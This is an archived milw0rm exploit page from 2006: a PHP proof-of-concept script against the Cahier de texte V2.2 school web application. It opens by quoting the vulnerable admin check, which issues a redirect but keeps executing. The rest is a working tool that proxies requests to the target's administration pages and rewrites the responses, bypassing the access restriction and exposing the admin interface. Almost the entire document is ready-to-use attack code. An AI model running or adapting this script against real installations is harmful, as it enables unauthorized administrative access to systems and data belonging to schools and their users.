<html><head><title>Cahier de texte 2.2 Bypass General Access Protection Exploit</title></head><pre>&lt;?
/*

  Informations
  ============
  Affected.scr..: Cahier de texte V2.2 (last version)
  Poc.ID........: 17061224
  Type..........: Bypass general access restriction
  Risk.level....: High
  Conditions....: None
  Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/
  Poc.link......: acid-root.new.fr/poc/17061224.txt
  Credits.......: DarkFig

  Vulnerable code
  ===============
  &lt;?php session_start();
  if (isset($_SESSION['nom_prof'])) { 
  if ($_SESSION['nom_prof']&lt;&gt;'Administrateur') { header(&quot;Location: ../index.php&quot;);}
  ;} else { header(&quot;Location: ../index.php&quot;);}?&gt;
  ...

*/

if(!isset($_GET['host']) || empty($_GET['host'])) headers();
if(!isset($_GET['wanted'])) $wanted = 'index.php';

$host = $_GET['host'];
$prox = $_GET['prox'];
$path = $_GET['path'];
echo sockxp($host,$path,$prox,&quot;administration/&quot;.$wanted);
exit(0);

function headers()
{
	print(&quot;&lt;html&gt;
&lt;head&gt;
 &lt;title&gt;Cahier de texte V2.2 Exploit&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
 &lt;form method='get' action='&quot;.$_SERVER['PHP_SELF'].&quot;'&gt;
  &lt;input type='text' name='host' value='host'&gt;
  &lt;input type='text' name='path' value='path'&gt;
  &lt;input type='text' name='prox' value='proxyhost:proxyport'&gt;
  &lt;input type='submit' value='Exploit'&gt;
 &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;&quot;);
	exit(0);
}

function sockxp($host,$path,$prox,$wanted)
{
	$hope = !empty($prox) ? $prox : $host.':80';
	preg_match(&quot;/^(\S*):([0-9]+){1,5}/&quot;,$hope,$hosta);
	$hosh = $hosta[1];
	$hosp = $hosta[2];
	
	$recv = '';
	$meth = $_SERVER['REQUEST_METHOD'];
	if(empty($hosh) || empty($hosp)) exit(1);

	if(!$sock = fsockopen($hosh,$hosp)) exit(1);
	$dat  = $meth.&quot; http://&quot;.$host;
	
	if($meth === &quot;POST&quot;) $dat .= &quot;/&quot;.str_replace(&quot;administration//&quot;,&quot;&quot;,$wanted);
	else $dat .= $path.$wanted;
	
	$dat .= &quot; HTTP/1.1\r\n&quot;;
	$dat .= &quot;Host: $host\r\n&quot;;
	$dat .= &quot;Connection: Close\r\n&quot;;
	
	if($meth === &quot;POST&quot;) {
		$postdata = get_postdata();
		$dat .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
		$dat .= &quot;Content-Length: &quot;.strlen($postdata).&quot;\r\n\r\n&quot;;
		$dat .= $postdata.&quot;\r\n\r\n&quot;;
	} else {
		$dat .= &quot;\r\n&quot;;
	}

	fputs($sock,$dat);
	while(!feof($sock)) $recv .= fgets($sock);
	fclose($sock);

	return html_replace($recv);
}

function html_replace($htmlc)
{
	global $host,$path,$prox;
	$iniv = $_SERVER['PHP_SELF'].&quot;?host=$host&amp;path=$path&amp;prox=$prox&amp;wanted=&quot;;
	$newc = str_replace(&quot;action=\&quot;&quot;,&quot;action=\&quot;$iniv&quot;,$htmlc);
	$newc = str_replace(&quot;=\&quot;..&quot;,&quot;=\&quot;http://${host}${path}administration/..&quot;,$newc);
	$newc = str_replace(&quot;a href=\&quot;&quot;,&quot;a href=\&quot;$iniv&quot;,$newc);
	$newc = str_replace(&quot;MM_goToURL('parent','&quot;,&quot;MM_goToURL('parent','$iniv&quot;,$newc);
	$newc = explode(&quot;\n&quot;,$newc);
	for($i=1;$i&lt;count($newc);$i++) {
		if(!preg_match(&quot;/(\S*):/&quot;,$newc[$i])) $v=1;
		if($v) $nnewc .= $newc[$i].&quot;\n&quot;;
	}
	return $nnewc;
}

function get_postdata()
{
	$postdata = '';
	foreach($_POST as $key =&gt; $value) {
		$postdata .= $key.&quot;=&quot;.$value.&quot;&amp;&quot;;
	}
	return $postdata;
}
?&gt;

# milw0rm.com [2006-12-26]</pre></html>